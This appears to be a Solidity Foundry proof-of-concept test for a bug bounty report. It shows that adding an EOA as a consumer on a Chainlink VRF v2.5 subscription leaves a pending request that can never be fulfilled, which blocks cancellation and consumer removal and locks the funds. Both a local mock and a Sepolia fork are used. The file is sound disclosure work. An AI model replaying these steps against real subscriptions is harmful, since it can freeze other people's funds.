// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/src/PoC.sol";
import {VRFV2PlusClient} from "./chainlinkcontracts/vrf/dev/libraries/VRFV2PlusClient.sol";
import {VRFCoordinatorV2_5Mock} from "./chainlinkcontracts/vrf/mocks/VRFCoordinatorV2_5Mock.sol";
import {IVRFCoordinatorV2_5} from "./Interfaces.sol";

contract PoCTest is PoC {
    error InsufficientBalance();

    VRFCoordinatorV2_5Mock public vrfCoordinatorV2_5Mock;
    address public subscriber;
    address public consumerEOA;
    address public oracleAddress;

    IERC20[] tokens;

    function setUp() public {
        subscriber = makeAddr("subscriber");
        consumerEOA = makeAddr("consumerEOA");
        oracleAddress = makeAddr("oracleAddress");

        // 1. Deploy the VRFCoordinatorV2_5Mock(https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/mocks/VRFCoordinatorV2_5Mock.sol). This contract is a mock of the VRFCoordinatorV2_5 contract(https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/dev/VRFCoordinatorV2_5.sol).
        vrfCoordinatorV2_5Mock = new VRFCoordinatorV2_5Mock(
            0.002 ether,
            40 gwei,
            0.004 ether
        );

        // Fund
        vm.deal(subscriber, 10000 * 10 ** 18);
        vm.deal(consumerEOA, 10000 * 10 ** 18);
        vm.deal(oracleAddress, 10000 * 10 ** 18);
    }

    function testEOARequestRandomnessToMockContract() public {
        // 2. Call the createSubscription function (which VRFCoordinatorV2_5Mock inherits) to create a new subscription.
        vm.startPrank(subscriber);
        uint256 subId = vrfCoordinatorV2_5Mock.createSubscription();
        // 3. Call the VRFCoordinatorV2_5Mock fundSubscription function to fund your newly created subscription. Note: You can fund with an arbitrary amount.
        vrfCoordinatorV2_5Mock.fundSubscription(subId, 1000 * 10 ** 18);
        // 4. Call the addConsumer function (which VRFCoordinatorV2_5Mock inherits) to add consumer EOA to the subscription.
        vrfCoordinatorV2_5Mock.addConsumer(subId, consumerEOA);
        vm.stopPrank();
        // 5. Request random words from your consumer contract.
        vm.startPrank(consumerEOA);
        uint256 requestId = vrfCoordinatorV2_5Mock.requestRandomWords(
            VRFV2PlusClient.RandomWordsRequest({
                keyHash: 0x787d74caea10b2b357790d5b5247c2f63d1d91572a9846f780606e4d953677ae,
                subId: subId,
                requestConfirmations: 3,
                callbackGasLimit: 100000,
                numWords: 2,
                extraArgs: VRFV2PlusClient._argsToBytes(
                    VRFV2PlusClient.ExtraArgsV1({nativePayment: false})
                )
            })
        );
        vm.stopPrank();
        // 6. Call the VRFCoordinatorV2_5Mock fulfillRandomWords function to fulfill the consumerEOA request.
        vm.prank(oracleAddress);
        vm.expectRevert();
        vrfCoordinatorV2_5Mock.fulfillRandomWords(requestId, consumerEOA);
        vm.stopPrank();

        // 7. cannot cancel subscription
        vm.startPrank(subscriber);
        vm.expectRevert();
        vrfCoordinatorV2_5Mock.cancelSubscription(subId, subscriber);
        vm.stopPrank();

        // 7. the protocol profit. withdraw function reverts because there was no profit.
        vm.expectRevert(InsufficientBalance.selector);
        vrfCoordinatorV2_5Mock.withdrawNative(payable(address(this)));
    }

    function testOnForkedSepolia() public {
        // Fork Sepolia
        string memory key = "SEPOLIA_RPC_URL";
        string memory SEPOLIA_RPC_URL = vm.envString(key);
        uint256 sepoliaFork = vm.createFork(SEPOLIA_RPC_URL);
        vm.selectFork(sepoliaFork);

        // ** setUp already done on Sepolia
        // subscriber: 0xB68AA9E398c054da7EBAaA446292f611CA0CD52B
        // consumerEOA: 0x559BEbfE1C72BEbC864dA7B57C20b0FfC9Ea94f0
        // 1. Create Subscription
        // tx: https://sepolia.etherscan.io/tx/0x453af6497d8009460eb39e30e13ddf7cf0d2265f4a989f9b269eaa2219689bae
        // subId: 60460247411911037425802822006743614175741550937198611579914906944958234929043
        // 2. Fund Subscription (1 ETH)
        // tx: https://sepolia.etherscan.io/tx/0xb5cbba79ddf84a6459ede88bb87470282eb2d4d40bf7d84cdbc43dfeff26b167
        // 3. Add Consumer EOA ()
        // tx: https://sepolia.etherscan.io/tx/0xebfc08acc6afb80ab5b2e11b95ea4f4c66f685de98d7fa6d706e17d83045989c
        // consumer : 0x559BEbfE1C72BEbC864dA7B57C20b0FfC9Ea94f0 (https://sepolia.etherscan.io/address/0x559BEbfE1C72BEbC864dA7B57C20b0FfC9Ea94f0)
        // 4. Request Random Words
        // tx: https://sepolia.etherscan.io/tx/0x63dd477fbd0f4c74adafb320664fed0213fa7d65822e52097a40663ed2f3cd89
        // requestId: 58947835698140441743665361935677730686203552907542856373451231334581578568921

        // ** getSubscription
        address VRFCoordinatorV2_5Address = 0x9DdfaCa8183c41ad55329BdeeD9F6A8d53168B1B;
        IVRFCoordinatorV2_5 vrfCoordinatorV2_5 = IVRFCoordinatorV2_5(
            VRFCoordinatorV2_5Address
        );
        uint256 subId = 60460247411911037425802822006743614175741550937198611579914906944958234929043;

        (
            uint96 balance,
            uint96 nativeBalance,
            uint64 reqCount,
            address subOwner,
            address[] memory consumers
        ) = vrfCoordinatorV2_5.getSubscription(subId);
        assertEq(balance, 0); // Link balance zero
        assertEq(nativeBalance, 1000000000000000000); // 1 ETH
        assertEq(reqCount, 0); // not fulfilled
        assertEq(subOwner, 0xB68AA9E398c054da7EBAaA446292f611CA0CD52B); // subscriber
        assertEq(consumers[0], 0x559BEbfE1C72BEbC864dA7B57C20b0FfC9Ea94f0); // consumerEOA

        // ** pendingRequestExists
        assertEq(vrfCoordinatorV2_5.pendingRequestExists(subId), true);

        // ** cannot cancel subscription(withdrawNative), removeConsumer
        vm.startPrank(subOwner);
        vm.expectRevert();
        vrfCoordinatorV2_5.cancelSubscription(subId, subOwner);
        vm.expectRevert();
        vrfCoordinatorV2_5.removeConsumer(subId, consumers[0]);
        vm.stopPrank();
    }
}
